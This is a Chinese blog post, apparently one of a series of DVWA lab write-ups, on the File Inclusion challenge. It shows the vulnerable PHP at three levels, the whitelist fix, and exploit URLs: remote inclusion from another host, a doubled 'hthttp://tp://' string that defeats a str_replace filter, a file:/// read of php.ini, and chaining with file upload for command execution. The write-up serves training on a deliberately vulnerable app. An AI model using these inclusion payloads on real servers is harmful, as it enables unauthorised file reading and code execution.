@@ -1,0 +1,185 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>File inclusion | MA4OUT7</title><meta name="keywords" content="DVWA"><meta name="author" content="JOe KKK"><meta name="copyright" content="JOe KKK"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="四、File inclusion1.Low1-1. source 123456 &lt;?php    $file &#x3D; $_GET[&#39;page&#39;]; &#x2F;&#x2F;The page we wish to display?&gt;  1-2. 注解1-3. 漏洞分析  对于参数 page 没有任何过滤，可以进行本地文件读取和远程文件读取 本地：http:&#x2F;&#x2F;www">
+<meta property="og:type" content="article">
+<meta property="og:title" content="File inclusion">
+<meta property="og:url" content="http://example.com/2021/02/24/dvwa/File%20inclusion/index.html">
+<meta property="og:site_name" content="MA4OUT7">
+<meta property="og:description" content="四、File inclusion1.Low1-1. source 123456 &lt;?php    $file &#x3D; $_GET[&#39;page&#39;]; &#x2F;&#x2F;The page we wish to display?&gt;  1-2. 注解1-3. 漏洞分析  对于参数 page 没有任何过滤，可以进行本地文件读取和远程文件读取 本地：http:&#x2F;&#x2F;www">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://cdn.pixabay.com/photo/2015/06/18/01/46/hack-813290__480.jpg">
+<meta property="article:published_time" content="2021-02-24T14:06:06.000Z">
+<meta property="article:modified_time" content="2021-03-20T14:16:43.148Z">
+<meta property="article:author" content="JOe KKK">
+<meta property="article:tag" content="DVWA">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://cdn.pixabay.com/photo/2015/06/18/01/46/hack-813290__480.jpg"><link rel="shortcut icon" href="https://cdn.pixabay.com/photo/2020/01/14/09/20/anonym-4764566__480.jpg"><link rel="canonical" href="http://example.com/2021/02/24/dvwa/File%20inclusion/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  date_suffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'null',
+  Snackbar: undefined,
+  source: {
+    jQuery: 'https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js',
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/js/jquery.justifiedGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/css/justifiedGallery.min.css'
+    },
+    fancybox: {
+      js: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isanchor: true
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = { 
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2021-03-20 22:16:43'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const fontSizeVal = saveToLocal.get('global-font-size')
+    if (fontSizeVal !== undefined) {
+      document.documentElement.style.setProperty('--global-font-size', fontSizeVal + 'px')
+    }
+    })(window)</script><meta name="generator" content="Hexo 5.2.0"></head><body><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="author-avatar"><img class="avatar-img" src="https://cdn.pixabay.com/photo/2020/01/14/09/20/anonym-4764566__480.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data"><div class="data-item is-center"><div class="data-item-link"><a href="/archives/"><div class="headline">文章</div><div class="length-num">31</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/tags/"><div class="headline">标签</div><div class="length-num">9</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/categories/"><div class="headline">分类</div><div class="length-num">10</div></a></div></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> List</span><i class="fas fa-chevron-down expand"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> Music</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> Movie</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://cdn.pixabay.com/photo/2015/06/18/01/46/hack-813290__480.jpg')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">MA4OUT7</a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> List</span><i class="fas fa-chevron-down expand"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> Music</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> Movie</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">File inclusion</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2021-02-24T14:06:06.000Z" title="发表于 2021-02-24 22:06:06">2021-02-24</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2021-03-20T14:16:43.148Z" title="更新于 2021-03-20 22:16:43">2021-03-20</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/DVWA/">DVWA</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="File inclusion"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h2 id="四、File-inclusion"><a href="#四、File-inclusion" class="headerlink" title="四、File inclusion"></a>四、File inclusion</h2><h3 id="1-Low"><a href="#1-Low" class="headerlink" title="1.Low"></a>1.Low</h3><p>1-1. source</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line"></span><br><span class="line">    $file &#x3D; $_GET[&#39;page&#39;]; &#x2F;&#x2F;The page we wish to display</span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>1-2. 注解<br>1-3. 漏洞分析</p>
+<ul>
+<li>对于参数 page 没有任何过滤，可以进行本地文件读取和远程文件读取</li>
+<li>本地：<code>http://www.example.com/</code></li>
+<li>远程访问：<code>http://192.168.153.130/dvwa/vulnerabilities/fi/page=http://192.168.5.12/phpinfo.txt</code>,相同域名头下可以获取信息</li>
+</ul>
+<h3 id="2-Mid"><a href="#2-Mid" class="headerlink" title="2.Mid"></a>2.Mid</h3><p>2-1. source</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line"></span><br><span class="line">    $file &#x3D; $_GET[&#39;page&#39;]; &#x2F;&#x2F; The page we wish to display</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; Bad input validation</span><br><span class="line">    $file &#x3D; str_replace(&quot;http:&#x2F;&#x2F;&quot;, &quot;&quot;, $file);</span><br><span class="line">    $file &#x3D; str_replace(&quot;https:&#x2F;&#x2F;&quot;, &quot;&quot;, $file);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>1-2. 注解<br>1-3. 漏洞分析</p>
+<ul>
+<li>使用 str_replace 函数是极其不安全的，因为可以使用双写绕过替换规则。例如 page=ht<a target="_blank" rel="noopener" href="http://tp//192.168.5.12/phpinfo.txt">http://tp://192.168.5.12/phpinfo.txt</a> 时，str_replace 函数会将 http://删除，于是 page=<a target="_blank" rel="noopener" href="http://192.168.5.12/phpinfo.txt%EF%BC%8C%E6%88%90%E5%8A%9F%E6%89%A7%E8%A1%8C%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E3%80%82">http://192.168.5.12/phpinfo.txt，成功执行远程命令。</a></li>
+<li>而且这里只是限制了远程文件包含，但是本地文件包含没有任何过滤</li>
+</ul>
+<h3 id="3-High"><a href="#3-High" class="headerlink" title="3.High"></a>3.High</h3><p>3-1. source</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;？php</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;Thepagewewishtodisplay</span><br><span class="line">$file&#x3D;$_GET[&#39;page&#39;];</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;Inputvalidation</span><br><span class="line">if(!fnmatch(&quot;file*&quot;,$file)&amp;&amp;$file!&#x3D;&quot;include.php&quot;)&#123;</span><br><span class="line">   &#x2F;&#x2F;Thisisn&#39;tthepagewewant!</span><br><span class="line">echo&quot;ERROR:Filenotfound!&quot;;</span><br><span class="line">exit;</span><br><span class="line">&#125;</span><br><span class="line">？&gt;</span><br></pre></td></tr></table></figure>
+
+<p>3-2. 注解</p>
+<ul>
+<li>fnmatch():判断文件名是否是 file 开头的，<br>3-3. 漏洞分析</li>
+<li>可以看到，High 级别的代码使用了 fnmatch 函数检查 page 参数，要求 page 参数的开头必须是 file，服务器才会去包含相应的文件。</li>
+<li>High 级别的代码规定只能包含 file 开头的文件，看似安全，不幸的是我们依然可以利用 file 协议绕过防护策略。<code>http://192.168.153.130/dvwa/vulnerabilities/fi/page=file:///C:/xampp/htdocs/dvwa/php.ini</code></li>
+<li>至于执行任意命令，需要配合文件上传漏洞利用。首先需要上传一个内容为 php 的文件，然后再利用 file 协议去包含上传文件（需要知道上传文件的绝对路径），从而实现任意命令执行。</li>
+</ul>
+<ol start="4">
+<li>预防</li>
+</ol>
+<ul>
+<li>source</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line"></span><br><span class="line">    $file &#x3D; $_GET[&#39;page&#39;]; &#x2F;&#x2F;The page we wish to display</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; Only allow include.php</span><br><span class="line">    if ( $file !&#x3D; &quot;include.php&quot; ) &#123;</span><br><span class="line">        echo &quot;ERROR: File not found!&quot;;</span><br><span class="line">        exit;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>可以看到，Impossible 级别的代码使用了白名单机制进行防护，简单粗暴，page 参数必须为“include.php”、“file1.php”、“file2.php”、“file3.php”之一，彻底杜绝了文件包含漏洞。</li>
+</ul>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined">JOe KKK</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="http://example.com/2021/02/24/dvwa/File%20inclusion/">http://example.com/2021/02/24/dvwa/File%20inclusion/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://example.com" target="_blank">MA4OUT7</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/DVWA/">DVWA</a></div><div class="post_share"><div class="social-share" data-image="https://cdn.pixabay.com/photo/2015/06/18/01/46/hack-813290__480.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2021/02/25/dvwa/SQL%20Injection/"><img class="prev-cover" src="https://cdn.pixabay.com/photo/2015/04/20/13/17/work-731198__480.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">SQL Injection</div></div></a></div><div class="next-post pull-right"><a href="/2021/02/23/dvwa/CSRF/"><img class="next-cover" src="https://cdn.pixabay.com/photo/2016/09/23/08/28/code-1689066__480.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">CSRF</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span> 相关推荐</span></div><div class="relatedPosts-list"><div><a href="/2021/02/20/dvwa/Brute Force/" title="Brute Force"><img class="cover" src="https://cdn.pixabay.com/photo/2016/11/07/12/08/cyber-security-1805632__480.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-02-20</div><div class="title">Brute Force</div></div></a></div><div><a href="/2021/02/23/dvwa/CSRF/" title="CSRF"><img class="cover" src="https://cdn.pixabay.com/photo/2016/09/23/08/28/code-1689066__480.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-02-23</div><div class="title">CSRF</div></div></a></div><div><a href="/2021/02/21/dvwa/Command injection/" title="Command injection"><img class="cover" src="https://cdn.pixabay.com/photo/2015/04/20/13/17/work-731198__480.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-02-21</div><div class="title">Command injection</div></div></a></div><div><a href="/2021/02/25/dvwa/SQL Injection/" title="SQL Injection"><img class="cover" src="https://cdn.pixabay.com/photo/2015/04/20/13/17/work-731198__480.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-02-25</div><div class="title">SQL Injection</div></div></a></div><div><a href="/2021/02/27/dvwa/XSS-stored/" title="XSS-stored"><img class="cover" src="https://cdn.pixabay.com/photo/2015/06/24/15/45/code-820275__480.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-02-27</div><div class="title">XSS-stored</div></div></a></div><div><a href="/2021/02/26/dvwa/XSS-reflected/" title="XSS-reflected"><img class="cover" src="https://cdn.pixabay.com/photo/2017/01/01/14/39/hacker-1944688__480.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-02-26</div><div class="title">XSS-reflected</div></div></a></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="card-info-avatar is-center"><img class="avatar-img" src="https://cdn.pixabay.com/photo/2020/01/14/09/20/anonym-4764566__480.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/><div class="author-info__name">JOe KKK</div><div class="author-info__description"></div></div><div class="card-info-data"><div class="card-info-data-item is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">31</div></a></div><div class="card-info-data-item is-center"><a href="/tags/"><div class="headline">标签</div><div class="length-num">9</div></a></div><div class="card-info-data-item is-center"><a href="/categories/"><div class="headline">分类</div><div class="length-num">10</div></a></div></div><a class="button--animated" id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xxxxxx"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn card-announcement-animation"></i><span>公告</span></div><div class="announcement_content">You are hacked by yourself</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9B%9B%E3%80%81File-inclusion"><span class="toc-number">1.</span> <span class="toc-text">四、File inclusion</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-Low"><span class="toc-number">1.1.</span> <span class="toc-text">1.Low</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-Mid"><span class="toc-number">1.2.</span> <span class="toc-text">2.Mid</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-High"><span class="toc-number">1.3.</span> <span class="toc-text">3.High</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2021/03/18/github%E8%AE%BF%E9%97%AE%E6%85%A2%E9%97%AE%E9%A2%98/" title="github访问慢"><img src="https://cdn.pixabay.com/photo/2016/11/19/14/00/code-1839406__480.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="github访问慢"/></a><div class="content"><a class="title" href="/2021/03/18/github%E8%AE%BF%E9%97%AE%E6%85%A2%E9%97%AE%E9%A2%98/" title="github访问慢">github访问慢</a><time datetime="2021-03-18T00:36:39.420Z" title="发表于 2021-03-18 08:36:39">2021-03-18</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/02/27/dvwa/XSS-stored/" title="XSS-stored"><img src="https://cdn.pixabay.com/photo/2015/06/24/15/45/code-820275__480.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="XSS-stored"/></a><div class="content"><a class="title" href="/2021/02/27/dvwa/XSS-stored/" title="XSS-stored">XSS-stored</a><time datetime="2021-02-27T14:06:06.000Z" title="发表于 2021-02-27 22:06:06">2021-02-27</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/02/26/dvwa/XSS-reflected/" title="XSS-reflected"><img src="https://cdn.pixabay.com/photo/2017/01/01/14/39/hacker-1944688__480.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="XSS-reflected"/></a><div class="content"><a class="title" href="/2021/02/26/dvwa/XSS-reflected/" title="XSS-reflected">XSS-reflected</a><time datetime="2021-02-26T14:06:06.000Z" title="发表于 2021-02-26 22:06:06">2021-02-26</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/02/25/dvwa/SQL%20Injection/" title="SQL Injection"><img src="https://cdn.pixabay.com/photo/2015/04/20/13/17/work-731198__480.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="SQL Injection"/></a><div class="content"><a class="title" href="/2021/02/25/dvwa/SQL%20Injection/" title="SQL Injection">SQL Injection</a><time datetime="2021-02-25T14:06:06.000Z" title="发表于 2021-02-25 22:06:06">2021-02-25</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url('https://cdn.pixabay.com/photo/2015/06/18/01/46/hack-813290__480.jpg')"><div id="footer-wrap"><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="font-plus" type="button" title="放大字体"><i class="fas fa-plus"></i></button><button id="font-minus" type="button" title="缩小字体"><i class="fas fa-minus"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
